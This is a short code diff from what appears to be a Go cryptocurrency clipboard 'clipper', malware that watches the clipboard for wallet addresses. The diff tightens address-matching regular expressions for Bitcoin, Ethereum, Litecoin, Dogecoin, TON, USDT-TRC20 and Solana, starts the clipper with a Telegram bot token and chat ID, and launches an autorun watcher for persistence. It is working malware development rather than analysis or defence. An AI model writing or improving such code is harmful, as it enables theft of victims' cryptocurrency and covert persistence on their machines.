@@ -12,13 +12,13 @@ import (
 )
 
 var (
-	btcRegex     = regexp.MustCompile(`^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$`)
-	ethRegex     = regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
-	ltcRegex     = regexp.MustCompile(`^(L|M)[A-Za-z0-9]{33}$|^ltc1[a-zA-Z0-9]{39,59}$`)
-	dogeRegex    = regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$`)
-	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9a-zA-Z_-]{46,48}$`)
-	usdttrcRegex = regexp.MustCompile(`^T[A-Za-z0-9]{33}$`)
-	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
+	btcRegex = regexp.MustCompile(`^(?:bc1[ac-hj-np-z02-9]{25,90}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$`)
+	ethRegex = regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
+	ltcRegex = regexp.MustCompile(`^(?:ltc1[ac-hj-np-z02-9]{39,59}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,34})$`)
+	dogeRegex = regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$`)
+	tonRegex = regexp.MustCompile(`^(?:EQ|UQ)[0-9A-Za-z_-]{46,48}$`)
+	usdttrcRegex = regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`)
+	solRegex = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
 )
 
 /* *** change this *** */
@@ -56,7 +56,7 @@ func main() {
 
 	// we starting main clipper process
 	clipper.StartClipper(chat_id, bot_token, matchers)
-
+	// we starting autorun watcher
 	autorun.StartWatcher(selfDir, autoRunName)
 
 	select {}
